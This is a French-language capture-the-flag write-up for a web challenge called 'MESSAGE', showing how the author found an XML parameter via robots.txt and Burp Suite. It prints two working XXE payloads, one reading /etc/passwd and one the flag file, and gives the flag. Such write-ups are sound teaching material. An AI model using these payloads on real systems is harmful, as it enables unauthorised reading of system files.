# MESSAGE 
```
200 pts
```

## Description
```
[FR]
Le roi aimerait vous confier un de ses secrets. Envoyez-lui un message pour obtenir ce secret.

[EN]
The king would like to entrust you with one of his secrets. Send him a message to obtain this secret.

Author: unpasswd

http://ctf.hackerlab.bj:2001
```

> Le challenge nous renvoie vers une page web où l'on peut écrire un message au roi Glèle. En regardant le fichier *robots.txt*, on trouve le mot *[message]*

<image src="File/message1.png">

> On a deduit que c'est probablement un paramètre que l'on peut utiliser pour envoyer un message au roi. Nous avons donc décidé d'intercepter les requêtes avec Burp Suite.

<image src="File/message2.png">
  
> Nous remarquons que le nom du paramètre POST envoyé au serveur est *xml*, ce qui nous fait penser à la vulnérabilité *XXE*.

> Nous avons donc écrit un payload pour essayer de lire le fichier */etc/passwd*, en n'oubliant pas de faire appel à notre entité externe dans la balise *<message>*.

```XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<xml><message>&xxe;</message></xml>
```
<image src="File/message3.png">
  
> Nous réussissons à lire le contenu du fichier */etc/passwd*. Après avoir cherché dans le répertoire racine, nous trouvons finalement le fichier *flag.txt* dans le répertoire personnel de l'utilisateur *www-data*, c'est-à-dire */var/www/*.

```XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///var/www/flag.txt"> ]>
<xml><message>&xxe;</message></xml>
```

<image src="File/message4.png">

# Flag
```CTF_great!_you_found_the_secret_by_xxe``` 🚀
